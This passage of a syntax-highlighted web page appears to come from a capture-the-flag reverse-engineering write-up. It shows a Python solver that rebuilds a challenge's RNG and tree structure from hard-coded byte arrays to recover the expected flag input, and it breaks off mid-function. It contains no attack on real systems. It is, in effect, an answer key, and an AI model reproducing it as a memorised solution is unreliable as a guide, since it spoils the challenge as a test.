class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x15</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xd4</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xb5</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xfc</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x4a</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x4c</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x8e</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xe9</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x55</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x2c</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xf5</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xe3</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x81</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xe2</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xa8</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x17</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x52</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x3a</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xd0</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xa8</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xcc</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x49</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x37</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xec</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x47</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span> <span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>target</span> <span class=o>=</span> <span class=p>[</span> <span class=mh>0xa2</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xaf</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x9d</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xb7</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xd2</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xcb</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xc7</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xc6</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xb0</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xd5</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xda</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xe3</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xe6</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xe8</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xe9</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xf3</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xf4</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xef</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xee</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xf7</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xf9</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xff</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xf5</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x09</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x1f</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x1a</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x46</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x0f</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x06</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0xdf</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span> <span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>seed</span> <span class=o>=</span> <span class=n>u32</span><span class=p>(</span><span class=nb>bytearray</span><span class=p>([</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x14</span><span class=p>,</span> <span class=mh>0x2b</span><span class=p>,</span> <span class=mh>0x01</span> <span class=p>]))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ic</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>seed</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rngesus</span><span class=p>()</span> <span class=o>-&gt;</span> <span class=nb>int</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>seed</span>
</span></span><span class=line><span class=cl>    <span class=n>seed</span> <span class=o>=</span> <span class=p>(</span><span class=n>seed</span> <span class=o>*</span> <span class=mh>0xbc8f</span><span class=p>)</span> <span class=o>%</span> <span class=mh>0x7fffffff</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>seed</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>lrbuf</span><span class=p>),</span> <span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>cur</span> <span class=o>=</span> <span class=n>lrbuf</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>8</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(cur)</span>
</span></span><span class=line><span class=cl>    <span class=n>buf</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>u64</span><span class=p>(</span><span class=nb>bytearray</span><span class=p>(</span><span class=n>cur</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>L</span><span class=o>=</span><span class=n>buf</span><span class=p>[:</span><span class=mi>32</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>R</span><span class=o>=</span><span class=n>buf</span><span class=p>[</span><span class=mi>32</span><span class=p>:]</span>
</span></span><span class=line><span class=cl><span class=n>R</span><span class=p>[</span><span class=mi>10</span><span class=p>]</span><span class=o>=</span><span class=mi>0</span> <span class=c1># pain</span>
</span></span><span class=line><span class=cl><span class=k>assert</span> <span class=nb>len</span><span class=p>(</span><span class=n>L</span><span class=p>)</span> <span class=o>==</span> <span class=mi>32</span>
</span></span><span class=line><span class=cl><span class=k>assert</span> <span class=nb>len</span><span class=p>(</span><span class=n>R</span><span class=p>)</span> <span class=o>==</span> <span class=mi>32</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;L:&#39;</span><span class=p>,</span> <span class=n>L</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;R:&#39;</span><span class=p>,</span> <span class=n>R</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>no_two_child</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>L</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>%</span><span class=mi>23</span> <span class=o>!=</span> <span class=n>R</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>%</span><span class=mi>23</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=n>L</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=n>R</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>no_two_child</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>no_two_child</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>t_v</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>target</span><span class=p>),</span> <span class=mi>4</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>cur</span> <span class=o>=</span> <span class=n>target</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>4</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(cur)</span>
</span></span><span class=line><span class=cl>    <span class=n>t_v</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>u32</span><span class=p>(</span><span class=nb>bytearray</span><span class=p>(</span><span class=n>cur</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;desired values:&#39;</span><span class=p>,</span> <span class=n>t_v</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pads</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>pads</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>rngesus</span><span class=p>()</span> <span class=o>%</span> <span class=mi>107</span> <span class=o>+</span> <span class=mi>97</span> <span class=o>+</span> <span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;number adds:&#39;</span><span class=p>,</span> <span class=n>pads</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>priority</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>priority</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>rngesus</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;priority:&#39;</span><span class=p>,</span> <span class=n>priority</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sp</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sp</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=n>priority</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=n>i</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>sp</span> <span class=o>=</span> <span class=nb>sorted</span><span class=p>(</span><span class=n>sp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>sp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># since i=4 has smallest priority it&#39;s the root</span>
</span></span><span class=line><span class=cl><span class=c1># pi: postorder index</span>
</span></span><span class=line><span class=cl><span class=n>ans</span><span class=o>=</span><span class=nb>bytearray</span><span class=p>([</span><span class=mi>0</span><span class=p>]</span><span class=o>*</span><span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>did</span><span class=o>=</span><span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>go</span><span class=p>(</span><span class=n>i</span><span class=p>:</span> <span class=nb>int</span><span class=p>,</span> <span class=n>pi</span><span class=p>:</span> <span class=nb>int</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>int</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=n>i</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>did</span>
</span></span><span class=line><span class=cl>    <span class=n>did</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>cr</span> <span class=o>=</span> <span class=n>t_v</span><span class=p>[</span><span class=n>pi</span><span class=p>]</span> <span class=o>-</span> <span class=n>pads</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>ans</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>=</span><span class=n>cr</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=n>pi</span><span class=p>,</span> <span class=nb>chr</span><span class=p>(</span><span class=n>cr</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>pi</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>no_two_child</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>assert</span> <span class=p>(</span><span class=n>L</span><span class=p>[</span><span class=n>pi</span><span class=p>]</span> <span class=o>-</span> <span class=n>cr</span><span class=p>)</span> <span class=o>%</span> <span class=mi>23</span> <span class=o>==</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=k>assert</span> <span class=p>(</span><span class=n>R</span><span class=p>[</span><span class=n>pi</span><span class=p>]</span> <span class=o>-</span> <span class=n>cr</span><span class=p>)</span> <span class=o>%</span> <span class=mi>23</span> <span class=o>==</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=n>li</span> <span class=o>=</span> <span class=p>(</span><span class=n>L</span><span class=p>[</span><span class=n>pi</span><span class=p>]</span> <span class=o>-</span> <span class=n>cr</span><span class=p>)</span> <span class=o>//</span> <span class=mi>23</span>
</span></span><span class=line><span class=cl>        <span class=n>ri</span> <span class=o>=</span> <span class=p>(</span><span class=n>R</span><span class=p>[</span><span class=n>pi</span><span class=p>]</span> <span class=o>-</span> <span class=n>cr</span><span class=p>)</span> <span class=o>//</span> <span class=mi>23</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>li</span><span class=p>,</span> <span class=n>ri</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>np</span> <span class=o>=</span> <span class=n>pi</span>
</span></span><span class=line><span class=cl>        <span class=n>np</span> <span class=o>=</span> <span class=n>go</span><span class=p>(</span><span class=n>ri</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=n>np</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>np</span> <span class=o>=</span> <span class=n>go</span><span class=p>(</span><span class=n>li</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=n>np</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>np</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;bad case:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>R</span><span class=p>[</span><span class=n>pi</span><span class=p>],</span> <span class=n>L</span><span class=p>[</span><span class=n>pi</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>np</span> <span class=o>=</span> <span class=n>pi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>R</span><span class=p>[</span><span class=n>pi</span><span class=p>]</span> <span class=o>-</span> <span class=n>cr</span><span class=p>)</span> <span class=o>%</span> <span class=mi>23</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>ri</span> <span class=o>=</span> <span class=p>(</span><span class=n>R</span><span class=p>[</span><span class=n>pi</span><span class=p>]</span> <span class=o>-</span> <span class=n>cr</span><span class=p>)</span> <span class=o>//</span> <span class=mi>23</span>
</span></span><span class=line><span class=cl>            <span class=k>assert</span> <span class=n>ri</span><span class=o>&gt;</span><span class=mi>0</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>priority</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=n>priority</span><span class=p>[</span><span class=n>ri</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=n>np</span> <span class=o>=</span> <span class=n>go</span><span class=p>(</span><span class=n>ri</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=n>np</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
